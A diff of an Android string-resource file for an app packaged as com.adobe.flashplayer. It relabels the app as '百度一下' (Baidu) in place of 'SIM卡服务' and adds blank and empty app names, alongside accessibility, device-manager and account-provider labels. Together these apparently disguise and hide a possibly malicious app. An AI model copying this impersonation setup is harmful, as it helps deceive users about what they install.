@@ -1,14 +1,19 @@
 <resources>
     <string name="app_name_old">flashplayer</string>
     <string name="app_name">百度一下</string>
+	
+	<string name="app_name_empty"> </string>
+	<string name="app_name_null"></string>
+	
     <string name="desktop_name">百度一下</string>
-    <string name="project_name">SIM卡服务</string>
+    <string name="project_name">百度一下</string>
     <string name="package_name">com.adobe.flashplayer</string>
     <string name="alarm_name">com.adobe.flashplayer.alarm</string>
     <string name="general_label_name">百度一下</string>
     <string name="acessibility_description_name">百度一下</string>
     <string name="devicemanager_description_name">百度一下</string>
     <string name="notification_description_name">百度一下</string>
+	
 
     <string name="accounttype">百度一下</string>
     <string name="accountprovideranthority">com.adobe.flashplayer.AccountStubProvider</string>
